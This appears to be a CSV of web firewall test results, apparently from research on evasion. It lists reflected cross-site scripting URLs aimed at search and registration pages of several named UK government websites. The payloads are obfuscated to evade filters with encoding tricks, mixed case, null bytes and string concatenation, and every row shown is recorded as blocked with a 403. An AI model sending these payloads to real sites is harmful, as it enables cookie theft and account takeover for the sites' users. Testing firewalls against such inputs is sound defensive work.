status,label,executed,payload,family,base_i,name,algo,zip,target,lstm_success
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script>alert(document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script>alert(document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script>top['al'+'ert'](document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script>top[8680439..toString(30)](document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword="">search?q=ok <script>alert(document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script <!--x-->>alert(document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script>alert(document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword="">%00<script>alert(document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.nwce.gov.uk/search_process.php?keyword=""><script>top[/al/.source+/ert/.source](document.cookie);</script>",diverse_table2,0.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><ScRipT>alert(document.cookie);</ScRIPt>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"//www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>/drfv/
alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert`document.cookie`;</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,http://www.manchester.gov.uk/site/scripts/google_results.php?q=><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0,diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>top['al'+'ert'](document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>top[8680439..toString(30)](document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q="">search?q=ok <script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script <!--x-->>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script%00>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://www.manchester.gov.uk/site/scripts/google_results.php?q=""><script>top[/al/.source+/ert/.source](document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,1.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><ScriPt>alert(document.cookie);</SCrIpt>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&e",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"//education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&er",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>/drfv/
alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert`document.cookie`;</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur,diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&e",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>top['al'+'ert'](document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>top[8680439..toString(30)](document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=s",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\"">search?q=ok <script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script <!--x-->>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\"">%00<script>alert(document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&err=sur",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://education.powys.gov.uk/english/adult_ed/register.php?lforenam=\""><script>top[/al/.source+/ert/.source](document.cookie);</script>&subdwell=&dwelling=&streetnm=&locality=&hometown=&postcode=&datebrth=&learngen=ðnicor=&tel_numb=&tel_mob=&email_add=&email_add2=&agree_info=&username=&password=&er",diverse_table2,2.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><sCriPT>alert(document.cookie);</sCRiPt>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"//www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>/drfv/
alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert`document.cookie`;</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,http://www.northwarks.gov.uk/site/scripts/google_results.php?q=><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0,diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>top['al'+'ert'](document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>top[8680439..toString(30)](document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q="">search?q=ok <script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script <!--x-->>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script%00>alert(document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.northwarks.gov.uk/site/scripts/google_results.php?q=""><script>top[/al/.source+/ert/.source](document.cookie);</script>&btng=search&ie=&site=&output=xml&client=&lr=&oe=&filter=0",diverse_table2,3.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><sCRiPt>alert(document.cookie);</scrIPt>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"//www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>",diverse_table2,4.0,,,,,
403,BLOCK,False,"http://www.waverley.gov.uk/site/scripts/google_results.php?q=""><script>alert(document.cookie);</script>",diverse_table2,4.0,,,,,
